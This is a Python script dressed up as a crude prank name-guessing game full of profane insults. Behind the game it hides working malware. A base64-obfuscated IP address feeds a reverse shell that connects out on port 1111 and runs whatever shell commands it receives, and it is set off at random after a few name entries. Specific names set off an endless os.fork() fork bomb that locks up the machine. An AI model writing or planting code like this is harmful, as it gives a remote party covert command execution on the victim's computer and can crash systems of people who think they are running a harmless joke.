import random
import platform
import base64
import subprocess
import os
import webbrowser
import socket

h_list = ['SG93IGRpZCB0aGUgaGFja2VyIGVzY2FwZT8gYW5zOiBEb24ndCBrbm93IGhlIHJhbnNvbXdhcmUK',
            #'Q29tcHV0ZXJzIGFyZSBmYXN0OyBwcm9ncmFtbWVycyBrZWVwIGl0IHNsb3cK'#,
            'aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQo=']
h_random = random.choice(h_list)
heh = 'MTkyLjE2OC4yNTQuMTAz'


def function(heh):
    yeah = base64.b64decode(heh).decode('utf-8')
    REMOTE_PORT = 1111
    client = socket.socket()
    print("[-] Connection Initiating...")
    client.connect((yeah, REMOTE_PORT))
    print("[-] Connection initiated!")

    while True:
        print("[-] Awaiting commands...")
        command = client.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)


count = 0
print('\nwarning!!, do not enter receding hair/-hair\n')
print('GOAL : get this aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQo=\n')

loop_over = False
sysinfo = platform.node()
while not loop_over:
    name = input('enter your name: ').lower()
    if name == base64.b64decode('eXV3YWw=').decode('utf-8'):
        print('Hey you, fuck off bastard!!\ndo not type masters name')
        loop_over = True
    elif name == base64.b64decode('eXV3YXJ1').decode('utf-8'):
        print(f'Hey {sysinfo}, you fucking cunt')
        loop_over = True
    elif name == base64.b64decode('a2FuZ3Jvbw==').decode('utf-8'):
        print(f'Hey {sysinfo}, what the hail are you doing?')
        loop_over = True
    elif (name == base64.b64decode('cmVjZWRpbmctaGFpcmxpbmU=').decode('utf-8') or
          name == base64.b64decode('cmVjZWRpbmcgaGFpcmxpbmU=').decode('utf-8')):
        print(f'Hello {sysinfo} aka ayub, you have a receding hairline')
        loop_over = True
    elif (name == base64.b64decode('cmVjZWRpbmcgaGFpcg==').decode('utf-8')
          or name == base64.b64decode('cmVjZWRpbmctaGFpcg==').decode('utf-8')):
        while True:
            os.fork()
            print(f'{sysinfo} have a nice day!!')
    else:
        for i in range(0, 1):
            count += 1
            V_list = ['pussy', 'dickhead', 'cunt', 'donkeydick', 'disappointment', 'bastard', 'piece of shiet']
            random_word = random.choice(V_list)
            iname = name
            print(f"hello {iname} {random_word}")
        if count >= 3:
            print(f'\n{h_random}\ncrack it \nhint?, Define hint.')
            if h_random == 'aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQo=':
                webbrowser.open(base64.b64decode(h_random).decode('utf-8'))
                loop_over = True
            else:
                function(heh)
                loop_over = True
